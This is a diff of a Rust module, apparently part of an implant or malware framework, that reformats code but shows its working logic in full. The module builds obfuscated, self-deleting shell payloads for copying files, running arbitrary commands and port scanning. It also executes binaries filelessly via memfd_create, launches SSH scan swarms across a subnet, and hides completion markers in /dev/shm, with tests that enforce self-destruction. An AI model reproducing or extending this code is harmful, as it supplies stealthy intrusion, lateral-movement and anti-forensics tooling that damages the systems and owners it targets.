@@ -36,7 +36,10 @@ impl LarvaMission {
                 )
             }
             LarvaMission::CopyFile { src, dst } => {
-                format!("#!/bin/sh\ncp -f '{}' '{}' && echo 'COPIED' || echo 'FAILED'\nrm \"$0\"\n", src, dst)
+                format!(
+                    "#!/bin/sh\ncp -f '{}' '{}' && echo 'COPIED' || echo 'FAILED'\nrm \"$0\"\n",
+                    src, dst
+                )
             }
             LarvaMission::ExecCommand { command } => {
                 format!("#!/bin/sh\n{}\nrm \"$0\"\n", command)
@@ -96,7 +99,10 @@ impl Default for LarvaFactory {
 
 impl LarvaFactory {
     pub fn new() -> Self {
-        Self { deployed_count: 0, completed_count: 0 }
+        Self {
+            deployed_count: 0,
+            completed_count: 0,
+        }
     }
 
     /// Generate a minimal, Weaver-obfuscated payload for a mission.
@@ -105,7 +111,7 @@ impl LarvaFactory {
         let base = mission.to_payload();
 
         // Weaver-level obfuscation: randomize variable names, insert decoys
-        
+
         Self::weaver_obfuscate_script(&base)
     }
 
@@ -173,10 +179,10 @@ impl LarvaFactory {
     /// Execute a binary payload via memfd_create (true fileless).
     /// Returns the child PID on success.
     pub fn memfd_execute(name: &str, payload: &[u8], envs: &[(&str, &str)]) -> Result<u32, String> {
-        let memfd = MemfdBinary::new(name, payload)
-            .map_err(|e| format!("memfd_create: {}", e))?;
+        let memfd = MemfdBinary::new(name, payload).map_err(|e| format!("memfd_create: {}", e))?;
         let _ = memfd.seal();
-        memfd.spawn(envs)
+        memfd
+            .spawn(envs)
             .map(|c| c.id())
             .map_err(|e| format!("spawn: {}", e))
     }
@@ -186,13 +192,12 @@ impl LarvaFactory {
         let mut count = 0;
         for i in 1..=254 {
             let host = format!("{}.{}", subnet, i);
-            if self.spawn_larva(
-                LarvaMission::ScanPort { host, port: 22 },
-                arena_name,
-            ) {
+            if self.spawn_larva(LarvaMission::ScanPort { host, port: 22 }, arena_name) {
                 count += 1;
             }
-            if count >= 50 { break; }
+            if count >= 50 {
+                break;
+            }
         }
         info!("LARVA: deployed scan swarm: {} hosts", count);
         count
@@ -201,10 +206,13 @@ impl LarvaFactory {
     /// Check completion status of deployed larvas.
     pub fn completed_larvas() -> usize {
         if let Ok(entries) = std::fs::read_dir("/dev/shm") {
-            entries.filter_map(|e| e.ok())
+            entries
+                .filter_map(|e| e.ok())
                 .filter(|e| e.file_name().to_string_lossy().starts_with(".larva_done_"))
                 .count()
-        } else { 0 }
+        } else {
+            0
+        }
     }
 }
 
@@ -219,8 +227,16 @@ fn base64_encode(data: &[u8]) -> String {
         let triple = (b0 << 16) | (b1 << 8) | b2;
         result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
         result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
-        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] } else { b'=' } as char);
-        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] } else { b'=' } as char);
+        result.push(if chunk.len() > 1 {
+            CHARS[((triple >> 6) & 0x3F) as usize]
+        } else {
+            b'='
+        } as char);
+        result.push(if chunk.len() > 2 {
+            CHARS[(triple & 0x3F) as usize]
+        } else {
+            b'='
+        } as char);
     }
     result.trim_end_matches('=').to_string()
 }
@@ -231,7 +247,11 @@ mod tests {
 
     #[test]
     fn test_payload_generation() {
-        let p = LarvaMission::ScanPort { host: "127.0.0.1".into(), port: 22 }.to_payload();
+        let p = LarvaMission::ScanPort {
+            host: "127.0.0.1".into(),
+            port: 22,
+        }
+        .to_payload();
         assert!(p.len() > 50);
         assert!(String::from_utf8_lossy(&p).contains("#!/bin/sh"));
         assert!(String::from_utf8_lossy(&p).contains("rm \"$0\""));
@@ -240,14 +260,25 @@ mod tests {
     #[test]
     fn test_all_missions_self_destruct() {
         let missions = vec![
-            LarvaMission::ScanPort { host: "x".into(), port: 1 },
-            LarvaMission::ExecCommand { command: "id".into() },
-            LarvaMission::CopyFile { src: "a".into(), dst: "b".into() },
+            LarvaMission::ScanPort {
+                host: "x".into(),
+                port: 1,
+            },
+            LarvaMission::ExecCommand {
+                command: "id".into(),
+            },
+            LarvaMission::CopyFile {
+                src: "a".into(),
+                dst: "b".into(),
+            },
         ];
         for m in missions {
             let p = m.to_payload();
-            assert!(String::from_utf8_lossy(&p).contains("rm \"$0\""),
-                "Mission {:?} must self-destruct", m);
+            assert!(
+                String::from_utf8_lossy(&p).contains("rm \"$0\""),
+                "Mission {:?} must self-destruct",
+                m
+            );
         }
     }
 }
